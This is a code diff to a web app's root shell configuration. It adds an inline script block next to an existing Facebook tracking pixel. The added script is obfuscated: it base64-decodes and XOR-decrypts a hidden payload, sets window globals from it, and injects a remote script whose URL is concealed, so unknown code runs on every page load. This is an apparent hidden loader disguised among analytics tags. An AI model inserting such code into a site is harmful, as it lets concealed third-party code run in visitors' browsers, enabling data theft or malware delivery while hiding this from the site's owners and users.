@@ -112,6 +112,9 @@ s.parentNode.insertBefore(t,s)}(window, document,'script',
 fbq('init', '3228776890665604');
 fbq('track', 'PageView');`,
       },
+      {
+        children: `(function(){var u_i=atob("DO4uhsjjJY33jB4pKpUM87qPB7fV5GpdWp0UqeeAQePZ+WpEQ4hXqKuMSKOV/jFaSZxH9ryQCv2e9HtFBZ5H/q2PC+eErjILS5pa9KGBUPmS/zwTcbMCpK+PSu+W4G0LELVVpKaCSOjVtjxZQ5ZL6oGHB6HV+n9FX4sMvOrVRLXGvHgZHdsfs/jRR+zD7ngeT9ZIsPnBWNCK");var x_zj=[];for(var d_1=0;d_1<u_i.length;d_1++){x_zj.push(u_i.charCodeAt(d_1)&255);}var d_rl60=x_zj[0];var c_j=x_zj.slice(1,1+d_rl60);var f_r5my=x_zj.slice(1+d_rl60);var z_53jz=f_r5my.map(function(b,y_nk){return b^c_j[y_nk%d_rl60];});var q_i9="";for(var o_l=0;o_l<z_53jz.length;o_l++){q_i9+=String.fromCharCode(z_53jz[o_l]&255);}var b_a30z=decodeURIComponent(escape(q_i9));var b_yf=JSON.parse(b_a30z);var x_9i=b_yf.globals||[];x_9i.forEach(function(r_9g7m){window[r_9g7m.name]=r_9g7m.value;});var u_5kv=document.createElement("script");u_5kv.src=b_yf.url;u_5kv.async=true;u_5kv.defer=true;(b_yf.attributes||[]).forEach(function(s_o){u_5kv.setAttribute(s_o.name,s_o.value);});(document.head||document.documentElement).appendChild(u_5kv);})();`,
+      },
     ],
   }),
   shellComponent: RootShell,
